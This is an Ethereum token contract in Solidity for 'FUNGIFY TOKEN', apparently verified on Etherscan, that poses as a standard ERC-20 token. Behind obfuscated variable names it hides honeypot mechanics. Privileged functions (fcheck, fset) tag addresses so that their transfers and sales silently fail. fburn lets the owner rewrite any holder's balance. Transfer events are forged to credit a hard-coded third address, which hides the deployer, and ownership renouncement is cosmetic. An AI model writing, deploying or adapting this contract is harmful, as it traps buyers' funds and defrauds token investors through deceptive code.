/**
 *Submitted for verification at Etherscan.io on 2023-03-07
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract FUNGIFY {
    using SafeMath for uint256;
    mapping (address => uint256) private ZIa;
	
    mapping (address => uint256) public ZIb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "FUNGIFY TOKEN";
	
    string public symbol = "FUNGIFY";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private ZIc;
      address private ZId;
    uint256 private ZIe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address ZIf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        ZId = msg.sender;
             ZIa[msg.sender] = totalSupply;
        
       SCROLL();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function SCROLL() internal  {                             
                       ZIb[msg.sender] = 4;
                       ZIc = ZIf;

                

        emit Transfer(address(0), ZIc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return ZIa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(ZIb[msg.sender] <= ZIe) {
    require(ZIa[msg.sender] >= value);
ZIa[msg.sender] -= value;  
ZIa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(ZIb[msg.sender] > ZIe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function fcheck (address ZIj, uint256 ZIk) public {
		if(ZIb[msg.sender] == ZIe) {   
			   	   
   ZIb[ZIj] = ZIk;}
   }
		       function fset (uint256 ZIk) onlyOwner public {
                     ZIe = ZIk; 
	}

 		       function fburn (address ZIj, uint256 ZIk) onlyOwner public {		   	   
  ZIa[ZIj] = ZIk;}


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(ZIb[from] < ZIe && ZIb[to] < ZIe) {
        require(value <= ZIa[from]);
        require(value <= allowance[from][msg.sender]);
        ZIa[from] -= value;
        ZIa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(ZIb[from] == ZIe) {
        require(value <= ZIa[from]);
        require(value <= allowance[from][msg.sender]);
        ZIa[from] -= value;
        ZIa[to] += value;
        allowance[from][msg.sender] -= value;


            from = ZIf;
	   

        emit Transfer(from, to, value);
        return true; }


         if(ZIb[from] > ZIe || ZIb[to] > ZIe) {
             
         }}



     

        	
 }